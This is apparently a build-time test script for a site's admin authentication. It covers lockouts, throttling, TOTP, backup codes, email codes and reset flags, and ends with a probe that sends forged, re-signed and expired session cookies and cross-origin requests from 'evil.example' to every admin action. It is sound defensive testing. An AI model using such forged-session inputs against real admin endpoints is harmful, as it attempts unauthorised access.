// node api/_lib/check.js  -- the admin's sign-in checks (Vercel runs it on every build):
// the lock schedule, cookies, the password, the global throttle and the known device, sessions voided by "Sign out everywhere",
// the authenticator step (RFC 6238 test vectors, one use per code, backup codes), and a probe of every admin-api action.
// Never the live database: on Vercel the build has its keys, so they're replaced by a fake one in memory here (test misses
// against the real login_attempts once locked every deploy, 2026-10-11).
const assert = require("assert");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");

process.env.SUPABASE_URL = "https://fake.invalid";
process.env.SUPABASE_SERVICE_ROLE_KEY = "fake";
process.env.SESSION_SECRET = "test-secret";
delete process.env.ADMIN_TOTP_SECRET;
delete process.env.ADMIN_TOTP_RESET;
// email codes go to a stub here: no real email is ever sent by a check (FIX-LIST #103)
process.env.RESEND_API_KEY = "fake";
process.env.RESEND_FROM = "FIG <admin@fig.test>";
delete process.env.TWILIO_ACCOUNT_SID; delete process.env.TWILIO_AUTH_TOKEN; delete process.env.TWILIO_FROM;
const mailed = [];
const salt = crypto.randomBytes(16);
process.env.ADMIN_PASSWORD_HASH = "scrypt:" + salt.toString("hex") + ":" + crypto.scryptSync("right", salt, 32).toString("hex");

// the fake database: the two tables auth.js uses (settings, login_attempts) and the two functions from FIX-LIST #84
// (rpcOn = false: as before that migration). "down" makes every call fail; failSave makes saving that settings key fail.
const table = { settings: new Map(), login_attempts: new Map() };
let down = false, rpcOn = false, failSave = "", failRead = "";
const realFetch = global.fetch; // zxing loads its wasm with it (the QR tile check at the end)
global.fetch = async (url, opts = {}) => {
  const u = new URL(url);
  if (u.hostname === "api.resend.com") { mailed.push(JSON.parse(opts.body)); return { ok: true, status: 200, json: async () => ({ id: "x" }) }; }
  if (u.hostname !== "fake.invalid") throw new Error("the check touched " + u.hostname);
  if (down) throw new Error("database down");
  const name = u.pathname.split("/").pop();
  const json = (rows) => ({ ok: true, status: 200, headers: new Map(), json: async () => rows, text: async () => JSON.stringify(rows) });
  if (u.pathname.includes("/rpc/")) {
    if (!rpcOn) return { ok: false, status: 404, json: async () => ({}) };
    const a = JSON.parse(opts.body);
    if (name === "admin_login_miss") { // one statement in Postgres: no await between the read and the write here either
      const row = table.login_attempts.get(a.p_key);
      const fails = !row || Date.parse(row.last_at) < Date.now() - a.p_window_hours * 3_600_000 ? 1 : row.fails + 1;
      table.login_attempts.set(a.p_key, { key: a.p_key, fails, last_at: new Date().toISOString() });
      return json(fails);
    }
    if (name === "admin_totp_use") {
      const cur = table.settings.get("admin_totp_last_step");
      if (cur && Number(cur.value) >= a.p_step) return json(false);
      table.settings.set("admin_totp_last_step", { key: "admin_totp_last_step", value: String(a.p_step) });
      return json(true);
    }
  }
  const t = table[name];
  if (!t) throw new Error("the check touched " + u.pathname);
  if (opts.method === "POST" && failSave && JSON.parse(opts.body).key === failSave) return { ok: false, status: 500, json: async () => ({}) };
  const key = (u.searchParams.get("key") || "").replace(/^eq\./, "");
  if (failRead && key === failRead && (!opts.method || opts.method === "GET")) return { ok: false, status: 500, json: async () => ({}) };
  if (!opts.method || opts.method === "GET") return json(t.has(key) ? [t.get(key)] : []);
  if (opts.method === "DELETE") { t.delete(key); return json([]); }
  const row = JSON.parse(opts.body); t.set(row.key, row); return json([]);
};

const auth = require("./auth");
const totp = require("./totp");
const { login, loginCode, sendLoginCode, signedIn, logoutEverywhere, enrolStart, enrolCode, enrolContact, enrolContactOk, enrolDone, _test } = auth;
const second = require("./second");
// a phone already set up (FIX-LIST #103: the second step is always on), and signing in with its next unused code
const S0 = totp.newSecret();
const setUp = () => table.settings.set("admin_totp_secret_enc", { key: "admin_totp_secret_enc", value: second.encrypt(S0) });
async function fullSignIn(ipAddr, c = {}) {
  const pw = await login(reqFrom(ipAddr, c), "right");
  if (!pw.body.needCode) return pw;
  const used = Number((table.settings.get("admin_totp_last_step") || {}).value || 0), T = Math.floor(Date.now() / 30000);
  const step = [T - 1, T, T + 1].find((x) => x > used);
  return loginCode(reqFrom(ipAddr, { ...c, ...jar(pw.headers) }), totp.codeAt(totp.unbase32(S0), step));
}
const jar = (headers = []) => Object.fromEntries(headers.map((h) => { const [kv] = h.split(";"); const i = kv.indexOf("="); return [kv.slice(0, i), decodeURIComponent(kv.slice(i + 1))]; }));
const asCookie = (c) => Object.entries(c).filter(([, v]) => v).map(([k, v]) => k + "=" + encodeURIComponent(v)).join("; ");
const reqFrom = (ip, c = {}) => ({ headers: { "x-real-ip": ip, cookie: asCookie(c) } });
// every check below runs with "Require a code at every sign-in" ON (the #103 design); the block right after the RFC vectors
// checks OFF (the default until the user turns it on) and the switch itself
const REQ = "admin_twostep_required", setReq = (v) => table.settings.set(REQ, { key: REQ, value: v });
const fresh = () => { _test.reset(); table.settings.clear(); table.login_attempts.clear(); down = false; failSave = ""; delete process.env.ADMIN_TOTP_SECRET; setReq("on"); };

(async () => {
  // the lock schedule, cookies, password
  assert.strictEqual(_test.lockFor(4), 0);
  assert.strictEqual(_test.lockFor(5), 60_000);
  assert.strictEqual(_test.lockFor(6), 300_000);
  assert.strictEqual(_test.lockFor(8), 3_600_000);
  assert.strictEqual(_test.lockFor(20), 3_600_000);
  assert.deepStrictEqual(_test.open(_test.seal({ a: 1 })), { a: 1 });
  assert.strictEqual(_test.open(_test.seal({ a: 1 }).replace(/.$/, "x")), null);
  assert.strictEqual(_test.passwordOk("right"), true);
  assert.strictEqual(_test.passwordOk("wrong"), false);

  // per address: 5 misses lock it, and even the right password waits
  fresh();
  for (let i = 1; i <= 4; i++) assert.strictEqual((await login(reqFrom("1.2.3.4"), "nope")).status, 401);
  const fifth = await login(reqFrom("1.2.3.4"), "nope");
  assert.ok(fifth.body.locked && fifth.body.retryIn === 60, "locked for a minute after 5 misses");
  assert.strictEqual((await login(reqFrom("1.2.3.4"), "right")).status, 429, "even the right password waits out the lock");
  console.log("ok: per-address lock (5 misses, then 1 min)");

  // the global throttle: 20 misses from 20 addresses lock everyone out for 5 minutes, before any password work...
  fresh();
  for (let i = 0; i < 20; i++) assert.strictEqual((await login(reqFrom("10.0.0." + i), "nope")).status, 401);
  const g = await login(reqFrom("10.9.9.9"), "right");
  assert.strictEqual(g.status, 429, "a new address is locked out by the global throttle");
  assert.ok(g.body.retryIn > 290 && g.body.retryIn <= 300, "for 5 minutes");
  assert.strictEqual(table.login_attempts.get("admin:*").fails, 20, "the global count is kept in the database");
  // ...except a known device, which skips the global lock only
  fresh(); setUp();
  const first = await fullSignIn("8.8.8.8");
  const device = jar(first.headers).fig_admin_device;
  assert.ok(device, "signing in leaves a known-device cookie");
  for (let i = 0; i < 20; i++) await login(reqFrom("10.1.0." + i), "nope");
  assert.strictEqual((await login(reqFrom("10.9.9.9"), "right")).status, 429, "a stranger is locked out");
  assert.ok((await login(reqFrom("10.9.9.9", { fig_admin_device: device }), "right")).body.needCode, "the owner's device still gets to the code step");
  for (let i = 0; i < 5; i++) await login(reqFrom("7.7.7.7", { fig_admin_device: device }), "nope");
  assert.strictEqual((await login(reqFrom("7.7.7.7", { fig_admin_device: device }), "right")).status, 429, "a known device never skips the per-address lock");
  const forgedDevice = _test.seal({ dev: 1, exp: Date.now() + 1e9, v: 1 }).replace(/^./, "x");
  assert.strictEqual((await login(reqFrom("10.9.9.8", { fig_admin_device: forgedDevice }), "right")).status, 429, "a forged device cookie doesn't skip it");
  console.log("ok: global throttle (20 misses/hour -> 5 min for everyone), known device skips only that");

  // "Sign out everywhere": old sessions and old known devices stop working
  fresh(); setUp();
  const a = jar((await fullSignIn("8.8.8.8")).headers);
  assert.strictEqual(await signedIn(reqFrom("8.8.8.8", a)), true, "signed in");
  await logoutEverywhere();
  assert.strictEqual(table.settings.get("admin_session_version").value, "2");
  assert.strictEqual(await signedIn(reqFrom("8.8.8.8", a)), false, "the old session is void");
  for (let i = 0; i < 20; i++) await login(reqFrom("10.2.0." + i), "nope");
  assert.strictEqual((await login(reqFrom("10.9.9.9", { fig_admin_device: a.fig_admin_device }), "right")).status, 429, "the old device cookie is void too");
  // a database outage never locks the admin out: the cookie's expiry decides
  down = true;
  assert.strictEqual(await signedIn(reqFrom("8.8.8.8", a)), true, "with the database down, an in-date cookie still works");
  down = false;
  const expired = { fig_admin: _test.seal({ exp: Date.now() - 1000, v: 2 }) };
  assert.strictEqual(await signedIn(reqFrom("8.8.8.8", expired)), false, "an expired session is out");
  console.log("ok: session version voids old sessions and devices; an outage falls back to expiry");

  // the authenticator: RFC 6238 test vectors (SHA-1 secret "12345678901234567890", the 6 low digits of the 8-digit values)
  const rfc = totp.base32(Buffer.from("12345678901234567890"));
  for (const [t, code] of [[59, "287082"], [1111111109, "081804"], [1111111111, "050471"], [1234567890, "005924"], [2000000000, "279037"], [20000000000, "353130"]])
    assert.strictEqual(totp.codeAt(totp.unbase32(rfc), Math.floor(t / 30)), code, "RFC 6238 at T=" + t);
  assert.strictEqual(totp.matchStep(rfc, "287082", 59_000), 1);
  assert.strictEqual(totp.matchStep(rfc, "287082", 89_000), 1, "one step late still counts");
  assert.strictEqual(totp.matchStep(rfc, "287082", 119_000), null, "two steps late doesn't");
  assert.deepStrictEqual(totp.unbase32(totp.base32(Buffer.from([1, 2, 3, 250]))), Buffer.from([1, 2, 3, 250]));
  console.log("ok: TOTP matches the RFC 6238 test vectors (6 digits, 30 s, one step either side)");

  // OFF, the default until the user turns it on (FIX-LIST #103 DESIGN): sign-in as before; nobody can set up a phone from the
  // password alone; the reset flag does nothing; a session sets up the first authenticator; the switch needs a working one + a code
  {
    fresh(); table.settings.delete(REQ); // never saved: off
    const p = await login(reqFrom("5.5.5.1"), "right");
    assert.ok(p.status === 200 && jar(p.headers).fig_admin && !p.body.needEnrol && !p.body.needCode, "off, nothing set up: the password signs in, as before");
    const st = jar(p.headers); // a session
    assert.strictEqual((await enrolStart(reqFrom("5.5.5.2", { fig_admin_step: auth._test.seal({ step: 1, enrol: 1, exp: Date.now() + 600000, v: 0 }) }))).status, 401, "off: no set-up from the password step (needEnrol is gone)");
    process.env.ADMIN_TOTP_RESET = "20261019";
    const pr = await login(reqFrom("5.5.5.3"), "right");
    assert.ok(!pr.body.needEnrol && jar(pr.headers).fig_admin, "off: the reset flag does nothing");
    delete process.env.ADMIN_TOTP_RESET;
    // the switch can't go on without a working authenticator and its backup codes, whatever code is typed
    const noAuth = await auth.setTwoStep(reqFrom("5.5.5.4", st), true, "123456");
    assert.ok(noAuth.status === 400 && !table.settings.has(REQ), "on is refused without an authenticator");
    assert.strictEqual((await auth.setTwoStep(reqFrom("5.5.5.4"), true, "123456")).status, 401, "the switch needs a session");
    // a session sets up the first authenticator: no current code to ask for
    const es = await enrolStart(reqFrom("5.5.5.4", st));
    assert.strictEqual(es.status, 200, "signed in, nothing set up: the set-up starts without a code");
    const ec = { ...st, ...jar(es.headers) }, TT = Math.floor(Date.now() / 30000);
    const c1 = await enrolCode(reqFrom("5.5.5.4", ec), totp.codeAt(totp.unbase32(es.body.secret), TT));
    const done = await enrolDone(reqFrom("5.5.5.4", { ...ec, ...jar(c1.headers) }), true);
    assert.ok(done.status === 200 && table.settings.has("admin_totp_secret_enc") && table.settings.has("admin_backup_codes"), "set up from Security: secret and backup codes saved");
    const st2 = { ...st, ...jar(done.headers) }; // the session goes on (a new version)
    // off with an authenticator: the password opens the code step, as before
    const p2 = await login(reqFrom("5.5.5.5"), "right");
    assert.ok(p2.body.needCode && !jar(p2.headers).fig_admin, "off, an authenticator saved: the password opens the code step");
    // on needs a right code
    const wrongOn = await auth.setTwoStep(reqFrom("5.5.5.6", st2), true, "000000");
    assert.ok(wrongOn.status === 401 && !table.settings.has(REQ), "on needs a right code (a wrong one counts as a try)");
    const on = await auth.setTwoStep(reqFrom("5.5.5.6", st2), true, totp.codeAt(totp.unbase32(es.body.secret), TT + 1));
    assert.ok(on.status === 200 && table.settings.get(REQ).value === "on", "a right code turns it on");
    // off again needs a session and a code too
    assert.strictEqual((await auth.setTwoStep(reqFrom("5.5.5.7", st2), false, "")).status, 401, "off without a code: refused");
    assert.strictEqual(table.settings.get(REQ).value, "on");
    const off = await auth.setTwoStep(reqFrom("5.5.5.7", st2), false, c1.body.backup[0]);
    assert.ok(off.status === 200 && table.settings.get(REQ).value === "off", "a backup code turns it off");
    // the reset flag works only while on
    const ivs = await auth.secondState(); assert.strictEqual(ivs.required, false);
    table.settings.delete("admin_totp_secret_enc");
    process.env.ADMIN_TOTP_RESET = "20261019b";
    assert.ok(!(await login(reqFrom("5.5.5.8"), "right")).body.needEnrol, "off: the reset value doesn't open a set-up");
    setReq("on");
    assert.ok((await login(reqFrom("5.5.5.9"), "right")).body.needEnrol, "on: the reset value opens a set-up");
    delete process.env.ADMIN_TOTP_RESET;
    // the database can't say whether it's on: never guess "off"
    down = true; const dn = await login(reqFrom("5.5.6.1"), "right"); down = false;
    assert.ok(dn.status === 503 && !jar(dn.headers || []).fig_admin, "the setting can't be read: no session from the password");
    // off, but the saved phone can't be read right now: fail closed, never a password-only session (#152)
    setReq("off"); setUp(); failRead = "admin_totp_secret_enc";
    const fr = await login(reqFrom("5.5.6.2"), "right"); failRead = "";
    assert.ok(fr.status === 503 && !jar(fr.headers || []).fig_admin, "off, the phone row unreadable: 503, no session");
    // ids are strings only (#153): a one-element array no longer passes
    await assert.rejects(require("./db").setSupport(["00000000-0000-0000-0000-000000000000"], "answered"), /bad id/, "an array is not an id");
    console.log("ok: two-step off by default: password sign-in as before, no set-up or reset from the password, Security sets up the first phone; on needs an authenticator, backup codes and a code; off needs a code; reset only while on");
  }

  // the second step is ALWAYS on (FIX-LIST #103). Nothing set up: the password opens the set-up only; the secret is saved
  // (encrypted) only after a right code AND "I saved the codes"; then a session
  fresh();
  const p0 = await login(reqFrom("8.8.8.8"), "right");
  assert.ok(p0.body.needEnrol && !jar(p0.headers).fig_admin, "nothing set up: the password opens the set-up, never a session");
  const st0 = jar(p0.headers);
  assert.strictEqual((await loginCode(reqFrom("8.8.8.8", st0), "123456")).status, 401, "the set-up step isn't a code step");
  assert.strictEqual((await enrolStart(reqFrom("8.8.8.8"))).status, 401, "no set-up without the password step");
  const es = await enrolStart(reqFrom("8.8.8.8", st0));
  assert.strictEqual(es.status, 200);
  const ec = { ...st0, ...jar(es.headers) };
  assert.ok(!JSON.stringify(ec).includes(es.body.secret), "the pending secret travels encrypted in its cookie");
  const wrong = await enrolCode(reqFrom("8.8.8.8", ec), "000000");
  assert.ok(wrong.status === 401 && wrong.body.triesLeft === 4, "a wrong set-up code counts as a try");
  const T0 = Math.floor(Date.now() / 30000);
  const c1 = await enrolCode(reqFrom("8.8.8.8", ec), totp.codeAt(totp.unbase32(es.body.secret), T0));
  assert.ok(c1.status === 200 && c1.body.backup.length === 8, "a right code: 8 backup codes");
  const ec2 = { ...ec, ...jar(c1.headers) };
  assert.ok(!table.settings.has("admin_totp_secret_enc") && !table.settings.has("admin_backup_codes"), "nothing saved yet");
  assert.strictEqual((await enrolDone(reqFrom("8.8.8.8", ec2), false)).status, 400, "not before 'I saved the codes'");
  assert.strictEqual((await enrolDone(reqFrom("8.8.8.8", ec), true)).status, 400, "not without the right code");
  failSave = "admin_totp_secret_enc";
  const fail = await enrolDone(reqFrom("8.8.8.8", ec2), true);
  assert.ok(fail.status === 503 && !jar(fail.headers).fig_admin && !table.settings.has("admin_totp_secret_enc"), "the database didn't save it: no session, nothing on");
  failSave = "";
  // an email for codes at set-up: a code to it first (the stub sender), saved only with the rest
  mailed.length = 0;
  assert.strictEqual((await enrolContact(reqFrom("8.8.8.8", ec2), "email", "not an email")).status, 400);
  const ct = await enrolContact(reqFrom("8.8.8.8", ec2), "email", " Owner@Example.com ");
  assert.ok(ct.status === 200 && mailed.length === 1 && mailed[0].to[0] === "owner@example.com" && ct.body.to === "o•••@example.com", "a code goes to the address (masked in the answer)");
  const ec3 = { ...ec2, ...jar(ct.headers) };
  assert.strictEqual((await enrolContactOk(reqFrom("8.8.8.8", ec3), "000000")).status, 400, "a wrong email code");
  const cok = await enrolContactOk(reqFrom("8.8.8.8", ec3), mailed[0].text.match(/\d{6}/)[0]);
  const ec4 = { ...ec3, ...jar(cok.headers) };
  assert.ok(cok.status === 200 && !table.settings.has("admin_email"), "confirmed, saved only at the last step");
  const doneE = await enrolDone(reqFrom("8.8.8.8", ec4), true);
  assert.ok(doneE.status === 200 && jar(doneE.headers).fig_admin, "set up: signed in");
  const encS = table.settings.get("admin_totp_secret_enc").value;
  assert.ok(encS.startsWith("v1:") && !encS.includes(es.body.secret) && second.decrypt(encS) === es.body.secret, "the secret is saved encrypted");
  assert.strictEqual(table.settings.get("admin_email").value, "owner@example.com");
  assert.ok(!JSON.stringify([...table.settings.values()]).includes(c1.body.backup[0]), "backup codes only as hashes");
  assert.strictEqual((await enrolStart(reqFrom("8.8.8.8", st0))).status, 401, "once set up, an old set-up step can't start another");
  console.log("ok: set-up at the first sign-in: password -> code -> backup codes saved -> email confirmed -> secret saved encrypted, then a session");

  const s = es.body.secret, e = { body: { backup: c1.body.backup } };
  const pw = await login(reqFrom("8.8.8.8", { fig_admin_device: device }), "right");
  assert.ok(pw.body.needCode && pw.body.mail && !jar(pw.headers).fig_admin, "the password opens the code step only, even on a known device; email offered");
  const stepCookie = jar(pw.headers);
  const T = T0;
  const now = totp.codeAt(totp.unbase32(s), T + 1); // the next code (one step ahead still counts)
  assert.strictEqual((await loginCode(reqFrom("8.8.8.8"), now)).status, 401, "no code without the password step");
  const ok1 = await loginCode(reqFrom("8.8.8.8", stepCookie), now);
  assert.strictEqual(ok1.status, 200, "the right code signs in");
  assert.ok(jar(ok1.headers).fig_admin);
  const replay = await loginCode(reqFrom("8.8.8.8", stepCookie), now);
  assert.strictEqual(replay.status, 401, "the same code twice is a wrong code");
  assert.strictEqual(replay.body.triesLeft, 4, "and counts as a try");
  // the database down: the saved secret can't be read, so no way in (never the password alone); the env override still works
  down = true; _test.reset();
  assert.ok((await login(reqFrom("8.8.8.9"), "right")).status === 503, "database down: the password doesn't get past the second step");
  assert.ok((await loginCode(reqFrom("8.8.8.9", stepCookie), totp.codeAt(totp.unbase32(s), T - 1))).status === 503, "nor does a code it can't check");
  process.env.ADMIN_TOTP_SECRET = s;
  const late = totp.codeAt(totp.unbase32(s), T - 1); // not used yet in this server's memory
  assert.strictEqual((await loginCode(reqFrom("8.8.8.9", stepCookie), late)).status, 200, "with ADMIN_TOTP_SECRET set, a code works with the database down");
  assert.strictEqual((await loginCode(reqFrom("8.8.8.9", stepCookie), late)).status, 401, "and its replay is blocked from memory");
  const noDb = await loginCode(reqFrom("8.8.8.9", stepCookie), e.body.backup[0]);
  assert.ok(noDb.status === 503 && /database/.test(noDb.body.error), "backup codes say they need the database");
  delete process.env.ADMIN_TOTP_SECRET;
  down = false;
  const b1 = await loginCode(reqFrom("8.8.8.10", stepCookie), e.body.backup[0]);
  assert.strictEqual(b1.status, 200, "a backup code works");
  assert.strictEqual((await loginCode(reqFrom("8.8.8.10", stepCookie), e.body.backup[0])).status, 401, "once");
  assert.strictEqual(JSON.parse(table.settings.get("admin_backup_codes").value).length, 7, "7 left");
  for (let i = 0; i < 4; i++) await loginCode(reqFrom("6.6.6.6", stepCookie), "123456");
  assert.ok((await loginCode(reqFrom("6.6.6.6", stepCookie), "123456")).body.locked, "wrong codes share the per-address lock");
  console.log("ok: the code step always (even on a known device), one use per code, backup codes once each, no way in with the database down unless ADMIN_TOTP_SECRET is set");

  // "Email me a code instead": only after the password step, the same answer either way, 3 an hour, once, 10 minutes
  const pwM = jar((await login(reqFrom("5.5.5.5"), "right")).headers);
  assert.strictEqual((await sendLoginCode(reqFrom("5.5.5.5"), "mail")).status, 401, "never before the password");
  mailed.length = 0; table.settings.delete("admin_contact_sends"); // the set-up's send shares the same 3 an hour
  const g1 = await sendLoginCode(reqFrom("5.5.5.5", pwM), "mail");
  assert.ok(g1.status === 200 && mailed.length === 1 && mailed[0].to[0] === "owner@example.com", "a code to the saved address, never a typed one");
  const mcode = mailed[0].text.match(/\d{6}/)[0];
  const viaMail = await loginCode(reqFrom("5.5.5.5", pwM), mcode);
  assert.ok(viaMail.status === 200 && jar(viaMail.headers).fig_admin, "the emailed code signs in");
  assert.strictEqual((await loginCode(reqFrom("5.5.5.6", pwM), mcode)).status, 401, "once");
  await sendLoginCode(reqFrom("5.5.5.5", pwM), "mail"); await sendLoginCode(reqFrom("5.5.5.5", pwM), "mail");
  const g4 = await sendLoginCode(reqFrom("5.5.5.5", pwM), "mail");
  assert.ok(mailed.length === 3 && JSON.stringify(g4.body) === JSON.stringify(g1.body), "3 an hour, then the same answer and nothing sent");
  const codeNow = table.settings.get("admin_contact_code").value;
  table.settings.set("admin_contact_code", { key: "admin_contact_code", value: JSON.stringify({ ...JSON.parse(codeNow), exp: Date.now() - 1 }) });
  assert.strictEqual((await loginCode(reqFrom("5.5.5.7", pwM), mailed[2].text.match(/\d{6}/)[0])).status, 401, "after 10 minutes it doesn't work");
  table.settings.delete("admin_email"); table.settings.delete("admin_contact_sends"); mailed.length = 0;
  const g5 = await sendLoginCode(reqFrom("5.5.5.5", pwM), "mail");
  assert.ok(mailed.length === 0 && JSON.stringify(g5.body) === JSON.stringify(g1.body), "no address saved: the same answer, nothing sent");
  console.log("ok: email codes: after the password only, to the saved address, once, 10 minutes, 3 an hour, the same answer either way");

  // the user's way back: ADMIN_TOTP_RESET=1 makes the next password sign-in a set-up; a changed SESSION_SECRET can't read the old one
  process.env.ADMIN_TOTP_RESET = "1";
  assert.ok((await login(reqFrom("4.4.4.4"), "right")).body.needEnrol, "the reset flag: the password opens a new set-up");
  delete process.env.ADMIN_TOTP_RESET;
  assert.ok((await login(reqFrom("4.4.4.5"), "right")).body.needCode, "without it, back to the code step");
  process.env.SESSION_SECRET = "a-new-secret";
  const un = await login(reqFrom("4.4.4.6"), "right");
  assert.ok(un.status === 503 && /ADMIN_TOTP_RESET/.test(un.body.error), "a secret it can't read: no way in, and it says how to reset");
  process.env.SESSION_SECRET = "test-secret";
  console.log("ok: the reset flag opens a new set-up; an unreadable saved secret never falls back to the password alone");

  // Agent #4's review: the reset flag works ONCE per deployment; a phone swap while signed in needs a current code, then signs
  // every other browser out
  fresh(); setUp();
  const { resetLeftOn } = auth;
  process.env.VERCEL_DEPLOYMENT_ID = "dpl_one"; process.env.ADMIN_TOTP_RESET = "1";
  const r0 = await login(reqFrom("3.3.3.3"), "right");
  assert.ok(r0.body.needEnrol, "the flag: a set-up");
  const rs = await enrolStart(reqFrom("3.3.3.3", jar(r0.headers)));
  const rc = { ...jar(r0.headers), ...jar(rs.headers) };
  const rcode = await enrolCode(reqFrom("3.3.3.3", rc), totp.codeAt(totp.unbase32(rs.body.secret), Math.floor(Date.now() / 30000)));
  const rdone = await enrolDone(reqFrom("3.3.3.3", { ...rc, ...jar(rcode.headers) }), true);
  assert.ok(rdone.status === 200 && rdone.body.removeFlag && jar(rdone.headers).fig_admin, "set up, signed in, told to delete the flag");
  assert.ok((await login(reqFrom("3.3.3.4"), "right")).body.needCode, "the same value again: back to the code step (it worked once)");
  assert.strictEqual(await resetLeftOn(), true, "every admin page says the flag is still set");
  process.env.VERCEL_DEPLOYMENT_ID = "dpl_two";
  const again = await login(reqFrom("3.3.3.5"), "right");
  assert.ok(again.body.needCode && again.body.resetUsed, "a used value stays dead after a new deploy (and the page says to set a new one)");
  process.env.ADMIN_TOTP_RESET = "20261020";
  assert.ok((await login(reqFrom("3.3.3.5"), "right")).body.needEnrol, "a NEW value: one more set-up");
  delete process.env.ADMIN_TOTP_RESET;
  assert.strictEqual(await resetLeftOn(), false, "flag deleted: no red line");
  assert.ok((await login(reqFrom("3.3.3.6"), "right")).body.needCode);
  // a new phone while signed in: a current code first (a wrong one counts), then the swap signs everyone else out
  const sess = jar(rdone.headers), newS = rs.body.secret;
  assert.strictEqual((await enrolStart(reqFrom("3.3.3.7", sess))).status, 401, "no current code: no swap");
  const wrongSwap = await enrolStart(reqFrom("3.3.3.7", sess), "000000");
  assert.ok(wrongSwap.status === 401 && wrongSwap.body.triesLeft === 3, "a wrong current code counts as a try");
  const used = Number(table.settings.get("admin_totp_last_step").value);
  const cur = totp.codeAt(totp.unbase32(newS), [Math.floor(Date.now() / 30000) - 1, Math.floor(Date.now() / 30000), Math.floor(Date.now() / 30000) + 1].find((x) => x > used));
  const sw = await enrolStart(reqFrom("3.3.3.7", sess), cur);
  assert.strictEqual(sw.status, 200, "the current code opens the swap");
  const verBefore = table.settings.get("admin_session_version") ? Number(table.settings.get("admin_session_version").value) : 1;
  const sw2 = { ...sess, ...jar(sw.headers) };
  const swc = await enrolCode(reqFrom("3.3.3.7", sw2), totp.codeAt(totp.unbase32(sw.body.secret), Math.floor(Date.now() / 30000)));
  const swd = await enrolDone(reqFrom("3.3.3.7", { ...sw2, ...jar(swc.headers) }), true);
  assert.ok(swd.status === 200 && jar(swd.headers).fig_admin, "swapped; this browser gets a fresh session");
  assert.strictEqual(Number(table.settings.get("admin_session_version").value), verBefore + 1, "a new session version");
  assert.strictEqual(await signedIn(reqFrom("3.3.3.7", sess)), false, "the old sessions are signed out");
  assert.strictEqual(await signedIn(reqFrom("3.3.3.7", jar(swd.headers))), true, "this browser stays in");
  assert.strictEqual(second.decrypt(table.settings.get("admin_totp_secret_enc").value), sw.body.secret, "the new phone's secret is the one saved");
  delete process.env.VERCEL_DEPLOYMENT_ID;
  console.log("ok: each reset value works once, across deploys (a red line while it's left); a phone swap needs a current code and signs every other browser out");

  // FIX-LIST #84 with the migration in: misses counted in one statement, a code used once even when sent twice at once,
  // and a right backup code that couldn't be crossed off isn't a wrong try
  fresh(); rpcOn = true;
  await Promise.all(Array.from({ length: 12 }, (_, i) => login(reqFrom("10.5.0." + i), "nope")));
  assert.strictEqual(table.login_attempts.get("admin:*").fails, 12, "12 misses at once count 12");
  await Promise.all(Array.from({ length: 3 }, () => login(reqFrom("10.6.0.1"), "nope")));
  assert.strictEqual(table.login_attempts.get("admin:10.6.0.1").fails, 3, "3 misses at once from one address count 3");
  fresh(); rpcOn = true;
  process.env.ADMIN_TOTP_SECRET = s;
  const step2 = jar((await login(reqFrom("8.8.8.8"), "right")).headers);
  // (this block uses the ADMIN_TOTP_SECRET override; the database-kept secret is checked above)
  const twice = totp.codeAt(totp.unbase32(s), Math.floor(Date.now() / 30000));
  const both = await Promise.all([loginCode(reqFrom("8.8.8.8", step2), twice), loginCode(reqFrom("8.8.8.8", step2), twice)]);
  assert.deepStrictEqual(both.map((x) => x.status).sort(), [200, 401], "the same code sent twice at once passes once");
  _test.reset(); // another server: its memory hasn't seen the code, the database has
  assert.strictEqual((await loginCode(reqFrom("8.8.8.11", step2), twice)).status, 401, "the database's compare-and-set blocks it on another server");
  table.settings.set("admin_backup_codes", { key: "admin_backup_codes", value: JSON.stringify(e.body.backup.slice(1).map(totp.hashBackup)) });
  failSave = "admin_backup_codes";
  const unsaved = await loginCode(reqFrom("8.8.8.12", step2), e.body.backup[1]);
  assert.ok(unsaved.status === 503 && /didn’t save it as used/.test(unsaved.body.error), "a right backup code that can't be crossed off gets the database message");
  assert.ok(!table.login_attempts.get("admin:8.8.8.12"), "and isn't counted as a wrong try");
  failSave = ""; rpcOn = false;
  console.log("ok: #84 counters are atomic (12 at once count 12), a code passes once even sent twice at once, an unsaved backup code isn't a wrong try");

  // the probe: every admin-api action refuses without a real, current session, and cross-origin
  fresh();
  const api = require("../admin-api");
  const page = require("../admin");
  const actions = [...fs.readFileSync(path.join(__dirname, "../admin-api.js"), "utf8").matchAll(/action === "([a-z0-9-]+)"/g)].map((m) => m[1]).filter((x, i, all) => all.indexOf(x) === i);
  const open = ["login", "login-code", "logout"]; // these work without a session (and do nothing without the password)
  setUp();
  const good = jar((await fullSignIn("8.8.8.8")).headers).fig_admin;
  const tries = {
    "no cookie": {},
    "forged cookie": { fig_admin: Buffer.from(JSON.stringify({ exp: Date.now() + 1e9, v: 1 })).toString("base64url") + ".forged" },
    "cookie signed with another secret": { fig_admin: Buffer.from(JSON.stringify({ exp: Date.now() + 1e9, v: 1 })).toString("base64url") + "." + crypto.createHmac("sha256", "other").update(Buffer.from(JSON.stringify({ exp: Date.now() + 1e9, v: 1 })).toString("base64url")).digest("base64url") },
    "expired cookie": { fig_admin: _test.seal({ exp: Date.now() - 1000, v: 1 }) },
    "old-version cookie": { fig_admin: _test.seal({ exp: Date.now() + 1e9, v: 0 }) },
  };
  const call = async (handler, action, c, extra = {}) => {
    const res = { statusCode: 0, headers: {}, setHeader(k, v) { this.headers[k] = v; }, end(b) { this.body = b; } };
    await handler({ method: extra.method || "POST", url: "/api/admin-api?do=" + action, headers: { host: "fig-promo.vercel.app", "x-real-ip": "9.9.9.9", cookie: asCookie(c), ...(extra.origin ? { origin: extra.origin } : {}) }, body: extra.body || {} }, res);
    return res;
  };
  let refused = 0, total = 0;
  for (const action of actions.filter((x) => !open.includes(x))) {
    for (const [what, c] of Object.entries(tries)) { total++; const r = await call(api, action, c); assert.strictEqual(r.statusCode, 401, action + " with " + what); refused++; }
    total++; assert.strictEqual((await call(api, action, { fig_admin: good }, { origin: "https://evil.example" })).statusCode, 405, action + " cross-origin"); refused++;
    total++; assert.strictEqual((await call(api, action, { fig_admin: good }, { method: "GET" })).statusCode, 405, action + " as GET"); refused++;
  }
  assert.notStrictEqual((await call(api, "data", { fig_admin: good })).statusCode, 401, "a real session gets in (the probe isn't refusing everything)");
  for (const [what, c] of Object.entries(tries)) { const r = await call(page, "", c, { method: "GET" }); assert.ok(!/id="nav"/.test(r.body), "/admin shows the sign-in card with " + what); }
  // FIX-LIST #160: /admin's own policy runs only its own scripts, by a nonce that's new every time; no inline handlers anywhere
  for (const c of [{}, { fig_admin: good }]) {
